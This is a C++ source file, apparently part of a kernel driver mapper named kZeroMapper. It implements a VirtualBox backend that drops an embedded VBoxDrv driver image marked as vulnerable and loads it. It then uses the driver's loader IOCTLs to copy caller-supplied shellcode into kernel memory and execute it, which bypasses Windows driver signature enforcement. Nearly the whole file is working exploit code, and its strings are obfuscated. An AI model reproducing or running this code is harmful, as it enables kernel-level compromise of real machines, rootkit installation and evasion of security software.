#include <kZeroMapper/kZeroMapperConfig.h>

#if defined(KZEROMAPPER_ENABLE_VIRTUALBOX)

#include "VirtualBoxBackend.h"
#include "../Common/vDriverLoader.h"
#include "vbox.h"
#include "vbox_sys.h"
#include <string>

#define VBoxDrvSvc pstrw( L"VBoxDrv" )
#define ImgName pstra( "furutaka" )
#define img_handle 0x1a000

std::string VirtualBoxBackend::Name( ) const
{
	return pstra( "VBOX" );
}

NTSTATUS VirtualBoxBackend::Load( )
{
	NTSTATUS status1 = 8282;
	m_Device = StartVulnerableDriver( &status1, &m_Status2 );

	if ( m_Device && m_Device != INVALID_HANDLE_VALUE )
		return STATUS_SUCCESS;

	StopVulnerableDriver( );

	return status1 ? status1 : 8282;
}

NTSTATUS VirtualBoxBackend::Unload( )
{
	return StopVulnerableDriver( );
}

NTSTATUS VirtualBoxBackend::Status2( ) const
{
	return m_Status2;
}

HANDLE VirtualBoxBackend::StartVulnerableDriver( NTSTATUS* outStatus, NTSTATUS* outStatus2 )
{
	auto hDevice = INVALID_HANDLE_VALUE;
	auto image = Tools::DecodePEBuffer( vbox_sys, sizeof( vbox_sys ) );

	if ( image.empty( ) )
		return INVALID_HANDLE_VALUE;

	if ( IsObjExist( pstrw( L"\\Device" ), VBoxDrvSvc ) )
		LOG_SEC( "[!] - [VBOX] Ldr: Active VirtualBox device found in system" );

	if ( auto Status = DropLoadAndOpenMapperDriver( Name( ).c_str( ), pstrw( L"\\\\.\\VBoxDrv" ), image.data( ), image.size( ), &hDevice, 0x8960 ) )
	{
		*outStatus2 = Status;
		*outStatus = 8960;
		return nullptr;
	}

	return hDevice;
}

NTSTATUS VirtualBoxBackend::Execute( uint8_t* shellCode, uint32_t codeSize )
{
	SUPCOOKIE cookie;
	SUPLDROPEN openLdr;
	DWORD bytesIo = 0;
	PSUPLDRLOAD plTask = nullptr;
	SUPSETVMFORFAST vmFast;
	SUPLDRFREE ldrFree;

	LOG_SEC( "[!] - [VBOX] TDLExploit %p", m_Device );

	if ( m_Device == INVALID_HANDLE_VALUE )
		return 8916;

	ZeroMemory( &cookie, sizeof( SUPCOOKIE ) );

	cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
	cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
	cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
	cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	cookie.Hdr.rc = 0;
	cookie.u.In.u32ReqVersion = 0;
	cookie.u.In.u32MinVersion = 0x00070002;

	memcpy( cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof( SUPCOOKIE_MAGIC ) );

	if ( !DeviceIoControl( m_Device, SUP_IOCTL_COOKIE, &cookie, SUP_IOCTL_COOKIE_SIZE_IN, &cookie, SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIo, nullptr ) )
	{
		LOG_SEC( "[-] - [VBOX] Ldr: SUP_IOCTL_COOKIE call failed" );
		return 8911;
	}

	ZeroMemory( &openLdr, sizeof( openLdr ) );

	openLdr.Hdr.u32Cookie = cookie.u.Out.u32Cookie;
	openLdr.Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
	openLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
	openLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
	openLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	openLdr.Hdr.rc = 0;
	openLdr.u.In.cbImage = codeSize;

	memcpy( openLdr.u.In.szName, ImgName, 9 );

	if ( !DeviceIoControl( m_Device, SUP_IOCTL_LDR_OPEN, &openLdr, SUP_IOCTL_LDR_OPEN_SIZE_IN, &openLdr, SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIo, nullptr ) )
	{
		LOG_SEC( "[-] - [VBOX] Ldr: SUP_IOCTL_LDR_OPEN call failed" );
		return 8912;
	}
	else
		LOG_SEC( "[!] - [VBOX] Ldr: openLdr.u.Out.pvImageBase = 0x%p", openLdr.u.Out.pvImageBase );

	auto ImgBase = openLdr.u.Out.pvImageBase;
	SIZE_T MemIo = PAGE_SIZE + codeSize;

	NtAllocateVirtualMemory( NtCurrentProcess( ), r_cast<void**>( &plTask ), 0, &MemIo, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

	if ( !plTask )
		return 8913;

	plTask->Hdr.u32Cookie = cookie.u.Out.u32Cookie;
	plTask->Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
	plTask->Hdr.cbIn = r_cast<uintptr_t>( &( r_cast<PSUPLDRLOAD>( 0 ) )->u.In.achImage ) + codeSize;
	plTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
	plTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
	plTask->Hdr.rc = 0;
	plTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
	plTask->u.In.pvImageBase = ImgBase;
	plTask->u.In.EP.VMMR0.pvVMMR0 = r_cast<RTR0PTR>( img_handle );
	plTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImgBase;
	plTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImgBase;
	plTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImgBase;

	memcpy( plTask->u.In.achImage, shellCode, codeSize );

	plTask->u.In.cbImage = codeSize;

	MemIo = 0;
	if ( !DeviceIoControl( m_Device, SUP_IOCTL_LDR_LOAD, plTask, plTask->Hdr.cbIn, plTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIo, nullptr ) )
	{
		LOG_SEC( "[-] - [VBOX] Ldr: SUP_IOCTL_LDR_LOAD call failed" );
		NtFreeVirtualMemory( NtCurrentProcess( ), r_cast<void**>( &plTask ), &MemIo, MEM_RELEASE );
		return 8914;
	}
	else
	{
		LOG_SEC( "[!] - [VBOX] Ldr: SUP_IOCTL_LDR_LOAD, success\r\n[!] - [VBOX] Shellcode mapped at 0x%p, Size = 0x%X\r\n[!] - [VBOX] Driver image mapped at 0x%I64X",
			ImgBase, codeSize, r_cast<uintptr_t>( ImgBase ) );
	}

	ZeroMemory( &vmFast, sizeof vmFast );

	vmFast.Hdr.u32Cookie = cookie.u.Out.u32Cookie;
	vmFast.Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
	vmFast.Hdr.rc = 0;
	vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
	vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
	vmFast.u.In.pVMR0 = r_cast<void*>( img_handle );

	if ( !DeviceIoControl( m_Device, SUP_IOCTL_SET_VM_FOR_FAST, &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN, &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIo, nullptr ) )
	{
		LOG_SEC( "[-] - [VBOX] Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed" );
		NtFreeVirtualMemory( NtCurrentProcess( ), r_cast<void**>( &plTask ), &MemIo, MEM_RELEASE );
		return 8915;
	}
	else
		LOG_SEC( "[!] - [VBOX] Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete" );

	LOG_SEC( "[!] - [VBOX] Ldr: SUP_IOCTL_FAST_DO_NOP" );

	uintptr_t paramOut = 0;
	DeviceIoControl( m_Device, SUP_IOCTL_FAST_DO_NOP, nullptr, 0, &paramOut, sizeof paramOut, &bytesIo, nullptr );

	LOG_SEC( "[!] - [VBOX] Ldr: SUP_IOCTL_LDR_FREE" );

	ZeroMemory( &ldrFree, sizeof ldrFree );

	ldrFree.Hdr.u32Cookie = cookie.u.Out.u32Cookie;
	ldrFree.Hdr.u32SessionCookie = cookie.u.Out.u32SessionCookie;
	ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
	ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
	ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	ldrFree.Hdr.rc = 0;
	ldrFree.u.In.pvImageBase = ImgBase;

	DeviceIoControl( m_Device, SUP_IOCTL_LDR_FREE, &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN, &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIo, nullptr );
	NtFreeVirtualMemory( NtCurrentProcess( ), r_cast<void**>( &plTask ), &MemIo, MEM_RELEASE );

	return STATUS_SUCCESS;
}

NTSTATUS VirtualBoxBackend::StopVulnerableDriver( )
{
	LOG_SEC( "[!] - [VBOX] SCM: Unloading vulnerable driver" );

	if ( m_Device && m_Device != INVALID_HANDLE_VALUE )
	{
		CloseMapperDevice( &m_Device );
	}

	return UnloadMapperDriver( );
}




#endif // KZEROMAPPER_ENABLE_VIRTUALBOX
